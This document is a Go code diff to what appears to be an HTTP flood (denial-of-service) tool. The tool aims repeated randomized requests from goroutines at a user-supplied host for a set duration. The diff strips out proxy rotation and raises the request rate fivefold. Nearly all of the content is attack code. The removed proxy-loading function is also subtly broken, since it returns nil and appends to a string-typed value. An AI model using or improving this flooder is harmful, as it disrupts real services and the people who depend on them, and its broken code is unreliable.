@@ -37,26 +37,6 @@ var (
 	proxyList    string
 )
 
-func loadProxyList() (string, error) {
-    file, err := os.Open("proxy.txt")
-    if err != nil {
-        return nil, err
-    }
-    defer file.Close()
-
-    scanner := bufio.NewScanner(file)
-    var proxyList string
-    for scanner.Scan() {
-        proxyURL := "https://" + scanner.Text() // or "https://" if using HTTPS proxy
-        proxyList = append(proxyList, proxyURL)
-    }
-
-    if err := scanner.Err(); err != nil {
-        return nil, err
-    }
-    return proxyList, nil
-}
-
 func buildblock(size int) (s string) {
 	var a []rune
 	for i := 0; i < size; i++ {
@@ -66,11 +46,6 @@ func buildblock(size int) (s string) {
 }
 
 func get() {
-	proxyURLStruct, err := url.Parse(proxyList[rand.Intn(len(proxyList))])
-	if err != nil {
-		fmt.Println("Error parsing proxy URL:", err)
-		return
-	}
 	if strings.ContainsRune(host, '?') {
 		param_joiner = "&"
 	} else {
@@ -78,9 +53,6 @@ func get() {
 	}
 
 	c := http.Client{
-		Transport: &http.Transport{
-			Proxy: http.ProxyURL(proxyURLStruct),
-		},
 		Timeout: 3500 * time.Millisecond,
 	}
 
@@ -122,7 +94,7 @@ func loop() {
 			return
 		}
 		go get()
-		time.Sleep(500 * time.Microsecond)
+		time.Sleep(100 * time.Microsecond)
 	}
 }
 
@@ -143,11 +115,6 @@ func main() {
 		color.Red.Println("Invalid duration. Please specify a positive duration.")
 		color.Blue.Println("Example usage:\n\t go run hentai.go  --host https://example.com --time 30s")
 		os.Exit(1)
-	}
-	proxyList, err := loadProxyList() // Use the proxyList from loadProxyList function
-	if err != nil {
-		fmt.Println("Error parsing proxy URL:", err)
-		return
 	}
 
 	color.Yellow.Println("Press control+c to stop")
